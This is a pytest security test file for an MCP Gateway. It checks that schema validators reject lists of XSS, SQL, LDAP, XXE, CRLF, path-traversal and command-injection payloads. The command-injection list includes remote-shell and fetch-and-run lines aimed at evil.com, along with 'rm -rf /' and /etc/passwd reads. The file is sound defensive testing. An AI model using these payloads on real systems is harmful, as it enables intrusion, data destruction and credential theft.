# -*- coding: utf-8 -*-
"""Location: ./tests/security/test_input_validation.py
Copyright 2025
SPDX-License-Identifier: Apache-2.0
Authors: Mihai Criveti

Comprehensive security tests for MCP Gateway input validation.
This module tests all input validation functions across the gateway schemas
to ensure proper security measures are in place against various attack vectors.

# Run all tests
pytest test_input_validation.py -v

# Run specific test class
pytest test_input_validation.py::TestSecurityValidation -v

# Run with coverage
pytest test_input_validation.py --cov=mcpgateway.schemas --cov=mcpgateway.validators

# Run specific attack category
pytest test_input_validation.py::TestSpecificAttackVectors -v

TODO: this test bails out on the first failed validation pattern, need to fix that to check all even if one fails
"""

# Standard
from datetime import datetime
import json
import logging
from unittest.mock import patch

# Third-Party
from pydantic import ValidationError, SecretStr
import pytest

# First-Party
from mcpgateway.schemas import AdminToolCreate, encode_datetime, GatewayCreate, PromptArgument, PromptCreate, ResourceCreate, RPCRequest, ServerCreate, ToolCreate, ToolInvocation
from mcpgateway.utils.base_models import to_camel_case
from mcpgateway.common.validators import SecurityValidator

# Configure logging for better test debugging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


class TestSecurityValidation:
    """Test security validation across all schemas."""

    # --- Test Constants ---
    VALID_TOOL_NAME = "valid_tool"
    VALID_URL = "https://example.com"
    VALID_DESCRIPTION = "This is a valid description"

    # XSS Attack Vectors
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "<form><button formaction=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "<a href=\"javascript:alert('XSS')\">Click</a>",
        "<math><mtext><script>alert('XSS')</script></mtext></math>",
    ]

    # SQL Injection Vectors
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1; DELETE FROM users WHERE 1=1; --",
        "' UNION SELECT * FROM passwords --",
        "1' AND SLEEP(5)--",
        "'; EXEC xp_cmdshell('dir'); --",
        "\\'; DROP TABLE users; --",
        "1' OR 1=1#",
        "' OR 'a'='a",
    ]

    # Command Injection Vectors
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& dir",
        "`rm -rf /`",
        "$(curl evil.com/shell.sh | bash)",
        "; wget http://evil.com/malware",
        "|| nc -e /bin/sh evil.com 4444",
        "; python -c 'import os; os.system(\"ls\")'",
        "\n/bin/bash\n",
        "; echo 'hacked' > /tmp/pwned",
    ]

    # Path Traversal Vectors
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/var/www/../../etc/passwd",
        "C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "file:///etc/passwd",
        "\\\\server\\share\\..\\..\\sensitive.txt",
    ]

    # LDAP Injection Vectors
    LDAP_INJECTION_PAYLOADS = [
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))",
        "*)(&",
        "*)(mail=*))%00",
        ")(cn=*))(|(cn=*",
        "*)(objectClass=*",
        "admin))((|userPassword=*",
        "*)(|(mail=*)(cn=*",
        ")(|(password=*)(username=*",
        "*))%00",
    ]

    # XXE Injection Vectors
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo/>',
        '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo/>',
    ]

    # CRLF Injection Vectors
    CRLF_INJECTION_PAYLOADS = [
        "value\r\nSet-Cookie: admin=true",
        "value\nLocation: http://evil.com",
        "value\r\n\r\n<script>alert('XSS')</script>",
        "value%0d%0aSet-Cookie:%20admin=true",
        "value%0aLocation:%20http://evil.com",
        "value\rSet-Cookie: session=hijacked",
        "value%0d%0a%0d%0a<html><script>alert('XSS')</script></html>",
        "value\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
    ]

    # Unicode/Encoding Attack Vectors
    UNICODE_PAYLOADS = [
        "＜script＞alert('XSS')＜/script＞",  # Full-width characters
        "\u003cscript\u003ealert('XSS')\u003c/script\u003e",  # Unicode escapes
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoding
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entities
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",  # Hex escapes
        "\ufeff<script>alert('XSS')</script>",  # Zero-width characters
        "‮⁦script⁩⁦>⁩alert('XSS')⁦⁩⁦/script⁩⁦>⁩",  # RTL override
    ]

    # Large Payload Vectors
    LARGE_PAYLOADS = [
        "A" * 10000,  # 10KB of A's
        "B" * 100000,  # 100KB of B's
        "C" * 1000000,  # 1MB of C's
        "x" * 5001,  # Just over 5000 char limit
        json.dumps({"key": "value" * 10000}),  # Large JSON
        "<div>" * 10000 + "</div>" * 10000,  # Nested HTML
    ]

    # Deep Nesting Vectors
    # Note: VALIDATION_MAX_JSON_DEPTH default is 30 (increased from 10 for complex APIs like Notion)
    # These payloads exceed that limit with 35 levels of nesting
    DEEP_NESTING_PAYLOADS = [
        {"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": {"k": {"l": {"m": {"n": {"o": {"p": {"q": {"r": {"s": {"t": {"u": {"v": {"w": {"x": {"y": {"z": {"aa": {"bb": {"cc": {"dd": {"ee": {"ff": {"gg": {"hh": {"ii": "too deep"}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}},
        [[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[["too deep"]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]],
        json.dumps(
            {
                "level": 1, "next": {
                    "level": 2, "next": {
                        "level": 3, "next": {
                            "level": 4, "next": {
                                "level": 5, "next": {
                                    "level": 6, "next": {
                                        "level": 7, "next": {
                                            "level": 8, "next": {
                                                "level": 9, "next": {
                                                    "level": 10, "next": {
                                                        "level": 11, "next": {
                                                            "level": 12, "next": {
                                                                "level": 13, "next": {
                                                                    "level": 14, "next": {
                                                                        "level": 15, "next": {
                                                                            "level": 16, "next": {
                                                                                "level": 17, "next": {
                                                                                    "level": 18, "next": {
                                                                                        "level": 19, "next": {
                                                                                            "level": 20, "next": {
                                                                                                "level": 21, "next": {
                                                                                                    "level": 22, "next": {
                                                                                                        "level": 23, "next": {
                                                                                                            "level": 24, "next": {
                                                                                                                "level": 25, "next": {
                                                                                                                    "level": 26, "next": {
                                                                                                                        "level": 27, "next": {
                                                                                                                            "level": 28, "next": {
                                                                                                                                "level": 29, "next": {
                                                                                                                                    "level": 30, "next": {
                                                                                                                                        "level": 31, "next": {
                                                                                                                                            "level": 32, "next": {
                                                                                                                                                "level": 33, "next": {
                                                                                                                                                    "level": 34, "next": {
                                                                                                                                                        "level": 35, "next": {}
                                                                                                                                                    }
                                                                                                                                                }
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        ),
    ]

    # Special Characters and Control Characters
    SPECIAL_CHAR_PAYLOADS = [
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f",  # Control chars
        "test\x00null",  # Null byte injection
        "test\r\ninjection",  # CRLF
        "test\u202eRTL",  # Right-to-left override
        "test\ufeffZWNBSP",  # Zero-width no-break space
        "test\u200bZWSP",  # Zero-width space
        "test\u200cZWNJ",  # Zero-width non-joiner
        "test\u200dZWJ",  # Zero-width joiner
        "\u0000\ufffe\uffff",  # Invalid Unicode
    ]

    # Invalid URL Vectors
    INVALID_URL_PAYLOADS = [
        "not-a-url",
        "ftp://example.com",  # Not HTTPS
        "file:///etc/passwd",  # File protocol
        "javascript:alert('XSS')",  # JavaScript protocol
        "data:text/html,<script>alert('XSS')</script>",  # Data URL
        "//example.com",  # Protocol-relative
        "http://[::1]",  # IPv6 localhost
        # "https://127.0.0.1",  # Localhost
        "https://0.0.0.0",  # All interfaces
        "https://169.254.169.254",  # AWS metadata
        "https://example.com:99999",  # Invalid port
        "https://user:pass@example.com",  # Credentials in URL
        "https://example.com/path?param=<script>",  # XSS in URL
        "https://exam ple.com",  # Space in domain
        "https://example.com\r\nX-Injection: true",  # CRLF in URL
    ]

    # Invalid JSON Schema Vectors
    INVALID_JSON_SCHEMA_PAYLOADS = [
        '{"type": "object", "properties": {"$ref": "http://evil.com/schema.json"}}',  # External ref
        '{"type": "object", "additionalProperties": {"$ref": "#/definitions/evil"}}',
        '{"type": "string", "pattern": "(.*){100000}"}',  # ReDoS pattern
        '{"type": "array", "minItems": 999999999}',  # Huge array
        '{"allOf": [{"$ref": "#"}, {"$ref": "#"}]}',  # Circular reference
    ]

    # --- Test Utility Functions ---

    def test_to_camel_case(self):
        """Test the to_camel_case utility function."""
        logger.debug("Testing to_camel_case utility function")
        assert to_camel_case("hello_world") == "helloWorld"
        assert to_camel_case("already_camel_case") == "alreadyCamelCase"
        assert to_camel_case("single") == "single"
        assert to_camel_case("") == ""
        assert to_camel_case("_leading_underscore") == "LeadingUnderscore"
        assert to_camel_case("trailing_underscore_") == "trailingUnderscore"
        assert to_camel_case("multiple___underscores") == "multipleUnderscores"

    def test_encode_datetime(self):
        """Test datetime encoding."""
        logger.debug("Testing encode_datetime function")
        dt = datetime(2023, 5, 22, 14, 30, 0)
        assert encode_datetime(dt) == "2023-05-22T14:30:00"

        # Test with timezone info
        # Standard
        from datetime import timezone

        dt_utc = datetime(2023, 5, 22, 14, 30, 0, tzinfo=timezone.utc)
        result = encode_datetime(dt_utc)
        assert "2023-05-22" in result

    # --- Test Tool Schemas ---

    def test_tool_create_name_validation(self):
        """Test tool‐name validation against valid names, XSS payloads and bad characters."""
        logger.debug("Testing tool name validation")

        # ------------------------------------------------------------------ helpers
        def must_fail(value: str, label: str = "Invalid name") -> None:
            """
            Ensure that creating a Tool with *value* for ``name`` raises ValidationError.

            Prints a green check‑mark when it is rejected and a red cross then fails
            the test when it is (incorrectly) accepted.
            """
            try:
                ToolCreate(name=value, url=self.VALID_URL)  # should raise
            except ValidationError as err:
                print(f"✅ {label} correctly rejected: {value!r} -> {err}")
            else:
                print(f"❌ {label} passed but should have failed: {value!r}")
                pytest.fail(f"{label} accepted although invalid: {value!r}")

        # ------------------------------------------------------------------ positives
        valid_names = [
            "valid_tool",
            "tool123",
            "my_tool",  # hyphens not allowed
            "tool_name",  # dots not allowed
            "ToolName",
            "a" * 50,  # at length limit
        ]
        for name in valid_names:
            logger.debug("Testing valid tool name: %s", name)
            tool = ToolCreate(name=name, url=self.VALID_URL)
            assert tool.name == name

        # ------------------------------------------------------------------ negatives
        # 1. XSS payloads
        for payload in self.XSS_PAYLOADS:
            logger.debug("Testing XSS payload in tool name: %.50s…", payload)
            must_fail(payload, "XSS name")

        # 2. Other illegal characters / formats
        invalid_names = [
            "tool name",  # space
            "tool@name",
            "tool#name",
            "tool$name",
            "tool%name",
            "tool&name",
            "tool*name",
            "tool(name)",
            "tool{name}",
            "tool[name]",
            "tool|name",
            "tool\\name",
            "tool/name",
            "tool<name>",
            "tool>name>",
            "tool?name",
            "tool!name",
            # "tool-name",      # hyphen
            # "tool.name",      # dot
            "",  # empty
            " ",  # just space
            "\n",  # newline
            "\t",  # tab
            "a" * 256,  # too long
            "1tool",  # must start with a letter
        ]
        for name in invalid_names:
            logger.debug("Testing invalid tool name: %r", name)
            must_fail(name)

    def test_tool_create_url_validation(self):
        """Test URL validation for tools."""
        logger.debug("Testing tool URL validation")

        # Helper function
        def must_fail(url: str, label: str = "Invalid URL") -> None:
            """Ensure that creating a Tool with invalid URL raises ValidationError."""
            try:
                ToolCreate(name=self.VALID_TOOL_NAME, url=url)
            except ValidationError as err:
                print(f"✅ {label} correctly rejected: {url!r} -> {err}")
            else:
                print(f"❌ {label} passed but should have failed: {url!r}")
                pytest.fail(f"{label} accepted although invalid: {url!r}")

        # Valid URLs
        valid_urls = [
            "https://example.com",
            "https://example.com:8080",
            "https://sub.example.com",
            "https://example.com/path",
            "https://example.com/path?query=value",
            "https://example.com/path#fragment",
            "https://192.168.1.1",
            "https://example.com/path/to/resource",
            "http://example.com",  # HTTP is allowed
            "ws://example.com",  # WebSocket is allowed
            "wss://example.com",  # Secure WebSocket is allowed
        ]

        for url in valid_urls:
            logger.debug(f"Testing valid URL: {url}")
            try:
                tool = ToolCreate(name=self.VALID_TOOL_NAME, url=url)
                assert tool.url == url
                print(f"✅ Valid URL accepted: {url}")
            except ValidationError as err:
                print(f"❌ Valid URL rejected but should have passed: {url!r} -> {err}")
                raise

        # Invalid URLs
        for payload in self.INVALID_URL_PAYLOADS:
            logger.debug(f"Testing invalid URL: {payload[:50]}...")
            must_fail(payload, f"Invalid URL ({payload[:30]}...)")

    def test_tool_create_description_validation(self):
        """Test description validation against XSS and length limits."""
        logger.debug("Testing tool description validation")

        # Helper function
        def must_fail(desc: str, label: str = "Invalid description") -> None:
            """Ensure that creating a Tool with invalid description raises ValidationError."""
            try:
                ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=desc)
            except ValidationError as err:
                print(f"✅ {label} correctly rejected: {desc[:50]!r}... -> {err}")
            else:
                print(f"❌ {label} passed but should have failed: {desc[:50]!r}...")
                pytest.fail(f"{label} accepted although invalid")

        # Valid descriptions
        valid_descriptions = [
            "This is a valid description",
            "Description with numbers 123",
            "Description with special chars: !@#$%",
            "Multi-line\ndescription",
            "Unicode: 你好世界 مرحبا بالعالم",
            "a" * 8192,  # At limit (changed from 4999)
        ]

        for desc in valid_descriptions:
            logger.debug(f"Testing valid description of length {len(desc)}")
            try:
                tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=desc)
                assert tool.description is not None
                print(f"✅ Valid description accepted (length: {len(desc)})")
            except ValidationError as err:
                print(f"❌ Valid description rejected: {desc[:50]!r}... -> {err}")
                raise

        # Invalid descriptions - XSS
        for payload in self.XSS_PAYLOADS:
            logger.debug(f"Testing XSS payload in description: {payload[:50]}...")
            must_fail(payload, "XSS description")

        # ✂️ Long descriptions (should be truncated, not rejected)
        logger.debug("Testing description that exceeds max length")
        long_desc = "x" * (SecurityValidator.MAX_DESCRIPTION_LENGTH + 100)
        tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=long_desc)

        assert tool.description is not None
        assert len(tool.description) == SecurityValidator.MAX_DESCRIPTION_LENGTH
        assert tool.description == long_desc[:SecurityValidator.MAX_DESCRIPTION_LENGTH]
        print(f"✅ Long description truncated to {SecurityValidator.MAX_DESCRIPTION_LENGTH} chars")

    def test_tool_create_headers_validation(self):
        """Test headers validation for depth and structure."""
        logger.debug("Testing tool headers validation")

        # Valid headers
        valid_headers = [
            {"Content-Type": "application/json"},
            {"Authorization": "Bearer token123"},
            {"X-Custom-Header": "value"},
            {"Multiple": "headers", "Are": "allowed"},
            {},  # Empty is valid
        ]

        for headers in valid_headers:
            logger.debug(f"Testing valid headers: {headers}")
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, headers=headers)
            assert tool.headers == headers

        # Invalid headers - too deep
        for payload in self.DEEP_NESTING_PAYLOADS:
            if isinstance(payload, dict):
                logger.debug(f"Testing deep nested headers")
                with pytest.raises(ValidationError) as exc_info:
                    ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, headers=payload)
                logger.debug(f"Validation error: {exc_info.value}")

    def test_tool_create_input_schema_validation(self):
        """Test input schema validation."""
        logger.debug("Testing tool input schema validation")

        # Helper function
        def must_fail(schema: dict, label: str = "Invalid schema") -> None:
            """Ensure that creating a Tool with invalid schema raises ValidationError."""
            try:
                ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=schema)
            except ValidationError as err:
                print(f"✅ {label} correctly rejected: {str(schema)[:50]}... -> {err}")
            else:
                print(f"❌ {label} passed but should have failed: {str(schema)[:50]}...")
                pytest.fail(f"{label} accepted although invalid")

        # Valid schemas
        valid_schemas = [
            {"type": "object", "properties": {}},
            {"type": "object", "properties": {"name": {"type": "string"}}},
            {"type": "array", "items": {"type": "string"}},
            {"type": "string", "pattern": "^[a-z]+$"},
            {"type": "number", "minimum": 0, "maximum": 100},
        ]

        for i, schema in enumerate(valid_schemas):
            logger.debug(f"Testing valid schema: {schema}")
            try:
                tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=schema)
                assert tool.input_schema is not None
                print(f"✅ Valid schema #{i + 1} accepted")
            except ValidationError as err:
                print(f"❌ Valid schema #{i + 1} rejected: {str(schema)[:50]}... -> {err}")
                raise

        # Invalid schemas - too deep
        for i, payload in enumerate(self.DEEP_NESTING_PAYLOADS):
            if isinstance(payload, dict):
                logger.debug(f"Testing deep nested schema")
                must_fail(payload, f"Deep nested schema #{i + 1}")

    def test_tool_create_request_type_validation(self):
        """Test request type validation based on integration type."""
        logger.debug("Testing tool request type validation")

        # # MCP integration types
        # mcp_valid = ["SSE", "STREAMABLEHTTP", "STDIO"]
        # for req_type in mcp_valid:
        #     logger.debug(f"Testing MCP request type: {req_type}")
        #     tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, integration_type="MCP", request_type=req_type)
        #     assert tool.request_type == req_type

        # REST integration types
        rest_valid = ["GET", "POST", "PUT", "DELETE", "PATCH"]
        for req_type in rest_valid:
            logger.debug(f"Testing REST request type: {req_type}")
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, integration_type="REST", request_type=req_type)
            assert tool.request_type == req_type

        # Invalid combinations
        logger.debug("Testing invalid MCP/REST request type combination")
        with pytest.raises(ValidationError) as exc_info:
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, integration_type="MCP", request_type="GET")  # REST type for MCP
        logger.debug(f"Validation error: {exc_info.value}")

        with pytest.raises(ValidationError) as exc_info:
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, integration_type="REST", request_type="SSE")  # MCP type for REST
        logger.debug(f"Validation error: {exc_info.value}")

    def test_tool_create_auth_assembly(self):
        """Test authentication field assembly."""
        logger.debug("Testing tool authentication assembly")

        # Basic auth
        basic_data = {"name": self.VALID_TOOL_NAME, "url": self.VALID_URL, "auth_type": "basic", "auth_username": "user", "auth_password": SecretStr("pass")}
        tool = ToolCreate(**basic_data)
        assert tool.auth.auth_type == "basic"
        assert tool.auth.auth_value is not None

        # Bearer auth
        bearer_data = {"name": self.VALID_TOOL_NAME, "url": self.VALID_URL, "auth_type": "bearer", "auth_token": "mytoken123"}
        tool = ToolCreate(**bearer_data)
        assert tool.auth.auth_type == "bearer"
        assert tool.auth.auth_value is not None

        # Custom headers auth
        headers_data = {"name": self.VALID_TOOL_NAME, "url": self.VALID_URL, "auth_type": "authheaders", "auth_header_key": "X-API-Key", "auth_header_value": "secret123"}
        tool = ToolCreate(**headers_data)
        assert tool.auth.auth_type == "authheaders"
        assert tool.auth.auth_value is not None

    def test_tool_create_jsonpath_filter(self):
        """Test JSONPath filter validation."""
        logger.debug("Testing tool JSONPath filter validation")

        # Valid JSONPath expressions
        valid_jsonpaths = [
            "$.data",
            "$.items[*].name",
            "$..price",
            "$.store.book[?(@.price < 10)]",
            "",  # Empty is valid
        ]

        for jsonpath in valid_jsonpaths:
            logger.debug(f"Testing valid JSONPath: {jsonpath}")
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, jsonpath_filter=jsonpath)
            assert tool.jsonpath_filter == jsonpath

    # --- Test Resource Schemas ---

    def test_resource_create_uri_validation(self):
        """Test resource URI validation."""
        logger.debug("Testing resource URI validation")

        # Valid URIs
        valid_uris = [
            "file://path/to/resource",
            "https://example.com/resource",
            "custom://resource/path",
            "resource-name",
            "path/to/resource",
            "/absolute/path",
            "resource.txt",
        ]

        for uri in valid_uris:
            logger.debug(f"Testing valid URI: {uri}")
            resource = ResourceCreate(uri=uri, name="Resource", content="Content")
            assert resource.uri == uri

        # Invalid URIs - XSS attempts
        for payload in self.XSS_PAYLOADS[:5]:  # Test subset
            logger.debug(f"Testing XSS payload in URI: {payload[:50]}...")
            with pytest.raises(ValidationError) as exc_info:
                ResourceCreate(uri=payload, name="Resource", content="Content")
            logger.debug(f"Validation error: {exc_info.value}")

        # Invalid URIs - too long
        logger.debug("Testing URI that exceeds max length")
        with pytest.raises(ValidationError) as exc_info:
            ResourceCreate(uri="x" * 256, name="Resource", content="Content")  # Changed from 2049
        logger.debug(f"Validation error: {exc_info.value}")

    def test_resource_create_content_validation(self):
        """Test resource content validation."""
        logger.debug("Testing resource content validation")

        # Helper function
        def must_fail(content, label: str = "Invalid content") -> None:
            """Ensure that creating a Resource with invalid content raises ValidationError."""
            try:
                ResourceCreate(uri="test://uri", name="Resource", content=content)
            except ValidationError as err:
                content_preview = str(content)[:50] if isinstance(content, (str, bytes)) else str(content)
                print(f"✅ {label} correctly rejected: {content_preview!r}... -> {err}")
            else:
                content_preview = str(content)[:50] if isinstance(content, (str, bytes)) else str(content)
                print(f"❌ {label} passed but should have failed: {content_preview!r}...")
                pytest.fail(f"{label} accepted although invalid")

        # Valid content
        valid_content = [
            "Plain text content",
            b"Binary content",
            "Multi-line\ncontent\nwith\nbreaks",
            "Unicode: 你好世界",
            "Special chars: !@#$%^&*()",
            "a" * 1000000,  # 1MB, within limit
        ]

        for content in valid_content:
            logger.debug(f"Testing valid content of type {type(content).__name__}, length {len(content)}")
            try:
                resource = ResourceCreate(uri="test://uri", name="Resource", content=content)
                assert resource.content == content
                print(f"✅ Valid content accepted (type: {type(content).__name__}, length: {len(content)})")
            except ValidationError as err:
                print(f"❌ Valid content rejected: type={type(content).__name__}, length={len(content)} -> {err}")
                raise

        # Invalid content - too large
        logger.debug("Testing content that exceeds max length")
        must_fail("x" * (SecurityValidator.MAX_CONTENT_LENGTH + 1), "Content too large")

        # Invalid content - HTML tags
        for i, payload in enumerate(self.XSS_PAYLOADS[:5]):
            logger.debug(f"Testing XSS payload in content: {payload[:50]}...")
            must_fail(payload, f"XSS content #{i + 1}")

    def test_resource_create_mime_type_validation(self):
        """Test MIME type validation."""
        logger.debug("Testing resource MIME type validation")

        # Helper function
        def must_fail(mime: str, label: str = "Invalid MIME") -> None:
            """Ensure that creating a Resource with invalid MIME type raises ValidationError."""
            try:
                ResourceCreate(uri="test://uri", name="Resource", content="Content", mime_type=mime)
            except ValidationError as err:
                print(f"✅ {label} correctly rejected: {mime!r} -> {err}")
            else:
                print(f"❌ {label} passed but should have failed: {mime!r}")
                pytest.fail(f"{label} accepted although invalid: {mime!r}")

        # Valid MIME types (based on allowed list in settings)
        valid_mime_types = [
            "text/plain",
            "application/json",
            "image/png",
            "application/vnd.api+json",  # Vendor type with +
            "text/plain; charset=utf-8",  # With parameters - might need special handling
            "application/x-custom",  # x- vendor type
            "text/x-custom",  # x- vendor type
        ]

        for mime in valid_mime_types:
            logger.debug(f"Testing valid MIME type: {mime}")
            try:
                resource = ResourceCreate(uri="test://uri", name="Resource", content="Content", mime_type=mime)
                assert resource.mime_type == mime
                print(f"✅ Valid MIME type accepted: {mime}")
            except ValidationError as err:
                print(f"❌ Valid MIME type rejected but should have passed: {mime!r} -> {err}")
                # Note: MIME types with parameters might need special handling
                if "; " in mime:
                    print(f"   💡 Hint: MIME type contains parameters, might need to strip them")

        # Invalid MIME types
        invalid_mime_types = [
            "not-a-mime-type",
            "text/",
            "/json",
            "text//plain",
            "text/plain/extra",
            "<script>",
            "text/plain\r\nX-Injection: true",
            "text/plain; charset=<script>",
        ]

        for mime in invalid_mime_types:
            logger.debug(f"Testing invalid MIME type: {mime}")
            must_fail(mime, f"Invalid MIME ({mime})")

    # --- Test Prompt Schemas ---

    def test_prompt_create_template_validation(self):
        """Test prompt template validation."""
        logger.debug("Testing prompt template validation")

        # Valid templates
        valid_templates = [
            "Simple template",
            "Template with {placeholder}",
            "Multiple {first} and {second} placeholders",
            "Template with {{ escaped }} braces",
            "Multi-line\ntemplate\nwith\nbreaks",
            "Unicode template: 你好 {name}",
        ]

        for template in valid_templates:
            logger.debug(f"Testing valid template of length {len(template)}")
            prompt = PromptCreate(name="test_prompt", template=template)
            assert prompt.template == template

        # Invalid templates - XSS
        for payload in self.XSS_PAYLOADS[:5]:
            logger.debug(f"Testing XSS payload in template: {payload[:50]}...")
            with pytest.raises(ValidationError) as exc_info:
                PromptCreate(name="test_prompt", template=payload)
            logger.debug(f"Validation error: {exc_info.value}")

        # Invalid templates - too long
        logger.debug("Testing template that exceeds max length")
        with pytest.raises(ValidationError) as exc_info:
            PromptCreate(name="test_prompt", template="x" * (SecurityValidator.MAX_TEMPLATE_LENGTH + 1))
        logger.debug(f"Validation error: {exc_info.value}")

    def test_prompt_argument_validation(self):
        """Test prompt argument validation."""
        logger.debug("Testing prompt argument validation")

        # Valid arguments
        valid_args = [
            PromptArgument(name="arg1", description="Description", required=True),
            PromptArgument(name="arg2", required=False),
            PromptArgument(name="arg_with_underscore"),
        ]

        prompt = PromptCreate(name="test_prompt", template="Template", arguments=valid_args)
        assert len(prompt.arguments) == len(valid_args)

    # --- Test Gateway Schemas ---

    def test_gateway_create_validation(self):
        """Test gateway creation validation."""
        logger.debug("Testing gateway creation validation")

        # Valid gateway
        gateway = GatewayCreate(name="test_gateway", url="https://gateway.example.com", description="Test gateway", transport="SSE")
        assert gateway.name == "test_gateway"

        # Test auth validation
        logger.debug("Testing gateway auth validation - missing credentials")
        with pytest.raises(ValidationError) as exc_info:
            GatewayCreate(
                name="test_gateway",
                url="https://gateway.example.com",
                auth_type="basic",
                # Missing username and password
            )
        logger.debug(f"Validation error: {exc_info.value}")

        # Valid auth
        gateway = GatewayCreate(name="test_gateway", url="https://gateway.example.com", auth_type="basic", auth_username="user", auth_password="pass")
        assert gateway.auth_value is not None

    # --- Test Server Schemas ---

    def test_server_create_validation(self):
        """Test server creation validation."""
        logger.debug("Testing server creation validation")

        # Valid server
        server = ServerCreate(name="test_server", description="Test server", icon="https://example.com/icon.png")
        assert server.name == "test_server"

        # Invalid icon URL
        logger.debug("Testing invalid icon URL")
        with pytest.raises(ValidationError) as exc_info:
            ServerCreate(name="test_server", icon="javascript:alert('XSS')")
        logger.debug(f"Validation error: {exc_info.value}")

        # Test associated items parsing
        server = ServerCreate(name="test_server", associated_tools="tool1,tool2,tool3", associated_resources="res1,res2", associated_prompts="prompt1")
        assert server.associated_tools == ["tool1", "tool2", "tool3"]
        assert server.associated_resources == ["res1", "res2"]
        assert server.associated_prompts == ["prompt1"]

    # --- Test RPC Schemas ---

    def test_rpc_request_validation(self):
        """Test RPC request validation."""
        logger.debug("Testing RPC request validation")

        # Valid RPC request
        rpc = RPCRequest(jsonrpc="2.0", method="tools_list", params={"filter": "active"}, id=1)  # Changed from "tools/list"
        assert rpc.method == "tools_list"

        # Invalid method names
        invalid_methods = [
            "method with spaces",
            "method@special",
            "<script>alert('XSS')</script>",
            "9method",  # Starts with number
            "",  # Empty
            "a" * 129,  # Too long
        ]

        for method in invalid_methods:
            logger.debug(f"Testing invalid RPC method: {repr(method)}")
            with pytest.raises(ValidationError) as exc_info:
                RPCRequest(jsonrpc="2.0", method=method)
            logger.debug(f"Validation error: {exc_info.value}")

        # Test params size limit
        logger.debug("Testing RPC params size limit")
        with patch("mcpgateway.config.settings.validation_max_rpc_param_size", 100):
            with pytest.raises(ValidationError) as exc_info:
                RPCRequest(jsonrpc="2.0", method="test", params={"data": "x" * 200})
            logger.debug(f"Validation error: {exc_info.value}")

    # --- Test Admin Schemas ---

    def test_admin_tool_create_json_validation(self):
        """Test admin tool creation with JSON string inputs."""
        logger.debug("Testing admin tool JSON validation")

        # Valid JSON strings
        admin_tool = AdminToolCreate(name="test_tool", url="https://example.com", headers='{"Content-Type": "application/json"}', input_schema='{"type": "object"}')
        assert admin_tool.headers == {"Content-Type": "application/json"}
        assert admin_tool.input_schema == {"type": "object"}

        # Invalid JSON
        logger.debug("Testing invalid JSON in admin tool")
